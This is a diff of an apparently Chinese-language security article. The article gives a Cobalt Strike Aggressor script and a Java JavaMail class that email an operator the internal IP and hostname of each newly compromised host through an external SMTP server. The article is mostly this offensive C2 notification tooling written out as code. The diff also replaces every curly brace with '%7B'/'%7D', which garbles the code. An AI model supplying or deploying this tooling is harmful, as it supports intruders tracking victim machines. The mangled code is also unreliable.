@@ -5,7 +5,7 @@
 
 
                                 阅读量   
-                                **390362**
+                                **390378**
                             
                         |
                         
@@ -55,10 +55,10 @@ java.awt.Point[x=3,y=4]
 了解到如何加载java类后通过调用`beacon_initial`方法在新目标上线时执行相应的方法。
 
 ```
-on beacon_initial {
+on beacon_initial %7B
 
 # 做一些东西
-}
+%7D
 ```
 
 通过以上知识编写好java类打包成Jar（源代码在下方会提供）提供一个带参数的方法在Aggressor脚本中的beacon_initial方法进行加载从而发送邮件。
@@ -71,22 +71,22 @@ on beacon_initial {
 
 ```
 import email.content.Main from: cna_mail.jar;
-on beacon_initial {
+on beacon_initial %7B
 # 循环获取所有beacon
 #xxxxxxx@163.com 代表接收发送邮箱
 #account 代表接收邮箱列表
-foreach $entry (beacons()) {
+foreach $entry (beacons()) %7B
 
-               if($entry['id'] == $1){
+               if($entry['id'] == $1)%7B
 @account = @("xxx@163.com","xxx@163.com");
 
 $value = [new Main];
 [$value setValue : "xxxxxxx@163.com","password","smtp.163.com",@account,$entry['computer'],"fajianren",,"Target ip:" . $entry['internal'] . " Target host: " . $entry['computer']];
 [$value  start];
 
-    }
-  }
-}
+    %7D
+  %7D
+%7D
 ```
 
 命令行版主要作用是在服务器上进行运行运行完成后无需在操作上线即可接收到邮箱内容为`Target ip:xxxx Target host:xxxx`，加载方法如下：
@@ -105,7 +105,7 @@ $value = [new Main];
 import email.content.Main from: cna_mail.jar;
 local('$smtp $myEmailAccount $myEmailPassword $Sender @Recipients');
 
-sub stage_attack{
+sub stage_attack%7B
 
  %options = $3;
 $smtp = %options['smtp'];
@@ -114,27 +114,27 @@ $myEmailPassword = %options['myEmailPassword'];
 $Sender = %options['Sender'];
  #输入的内容是以,隔开的所以这里有,进行分割
 @Recipients = split(',',%options['Recipients']);
- }
+ %7D
 
 
-on beacon_initial {
+on beacon_initial %7B
 
     show_message($myEmailPassword);
 
-foreach $entry (beacons()) {
+foreach $entry (beacons()) %7B
 
-               if($entry['id'] == $1){
+               if($entry['id'] == $1)%7B
 $value = [new Main];
 [$value setValue : $myEmailAccount,$myEmailPassword,$smtp,@Recipients,$entry['computer'] ,$Sender,"Target ip:" . $entry['internal'] . " Target host: " . $entry['computer']];
 [$value  start];
 println(@Recipients);
-  }
-   }
-}
+  %7D
+   %7D
+%7D
 
-popup attacks {
+popup attacks %7B
 local('$dialog %defaults');
-  item "set email"{
+  item "set email"%7B
 # setup our defaults
 %defaults["smtp"] = "smtp.163.com";
 %defaults["myEmailAccount"]  = "xxx@163.com";
@@ -152,8 +152,8 @@ dbutton_action($dialog, "Launch");
 
         # show our dialog
         dialog_show($dialog);
-  }
-}
+  %7D
+%7D
 ```
 
 <strong>GUI版本加载方法*<br>
@@ -182,7 +182,7 @@ import java.util.Properties;
  * JavaMail 版本: 1.6.0
  * JDK 版本: JDK 1.7 以上（必须）
  */
-public class Main {
+public class Main %7B
 
 // 发件人的 邮箱 和 密码（替换为自己的邮箱和密码）
 // PS: 某些邮箱服务器为了增加邮箱本身密码的安全性，给 SMTP 客户端设置了独立密码（有的邮箱称为“授权码”）,
@@ -198,8 +198,8 @@ public  String subject= "";
 public  String myEmailSMTPHost = "smtp.163.com";
 
 // 收件人邮箱（替换为自己知道的有效邮箱）
-public static String[] receiveMailAccount={"XXXXXXX@163.com"};
-public  void setValue(String myEmailAccount,String myEmailPassword,String myEmailSMTPHost,String[] receiveMailAccount,String subject,String personal,String value){
+public static String[] receiveMailAccount=%7B"XXXXXXX@163.com"%7D;
+public  void setValue(String myEmailAccount,String myEmailPassword,String myEmailSMTPHost,String[] receiveMailAccount,String subject,String personal,String value)%7B
 this.myEmailAccount = myEmailAccount;
 this.myEmailPassword = myEmailPassword;
 this.myEmailSMTPHost = myEmailSMTPHost;
@@ -209,8 +209,8 @@ this.value=value;
 this.subject=subject;
 
 
-}
-public void start(){
+%7D
+public void start()%7B
 Properties props = new Properties();// 参数配置
 props.setProperty("mail.transport.protocol", "smtp");   // 使用的协议（JavaMail规范要求）
 props.setProperty("mail.smtp.host", myEmailSMTPHost);   // 发件人的邮箱的 SMTP 服务器地址
@@ -241,7 +241,7 @@ session.setDebug(true); // 设置为debug模式, 可以查看详细的发送 log
 
 // 3. 创建一封邮件
 MimeMessage message = null;
-try {
+try %7B
 message = createMimeMessage(session, myEmailAccount, receiveMailAccount);
 
 
@@ -269,10 +269,10 @@ transport.sendMessage(message, message.getAllRecipients());
 
 // 7. 关闭连接
 transport.close();
-} catch (Exception e) {
+%7D catch (Exception e) %7B
 e.printStackTrace();
-}
-}
+%7D
+%7D
 
 /**
  * 创建一封只包含文本的简单邮件
@@ -283,7 +283,7 @@ e.printStackTrace();
  * @return
  * @throws Exception
  */
-public  MimeMessage createMimeMessage(Session session, String sendMail, String[] receiveMail) throws Exception {
+public  MimeMessage createMimeMessage(Session session, String sendMail, String[] receiveMail) throws Exception %7B
 // 1. 创建一封邮件
 MimeMessage message = new MimeMessage(session);
 
@@ -291,14 +291,14 @@ MimeMessage message = new MimeMessage(session);
 message.setFrom(new InternetAddress(sendMail, personal, "UTF-8"));
 Address a = null;
 // 3. To: 收件人（可以增加多个收件人、抄送、密送）
-//for (String email:receiveMail) {
+//for (String email:receiveMail) %7B
 // a = new InternetAddress(email, personal1, "UTF-8");
-//}
+//%7D
 InternetAddress[] address = new InternetAddress[receiveMail.length];
-for (int i = 0; i &lt; receiveMail.length; i++) {
+for (int i = 0; i &lt; receiveMail.length; i++) %7B
 
 address[i] = new InternetAddress(receiveMail[i]);
-}
+%7D
 message.setRecipients(MimeMessage.RecipientType.TO, address);
 
 // 4. Subject: 邮件主题（标题有广告嫌疑，避免被邮件服务器误认为是滥发广告以至返回失败，请修改标题）
@@ -314,9 +314,9 @@ message.setSentDate(new Date());
 message.saveChanges();
 
 return message;
-}
+%7D
 
-}
+%7D
 ```
 
 编译好cna_mail.jar跟Aggressor脚本放入Cobalt Scrike目录即可使用。
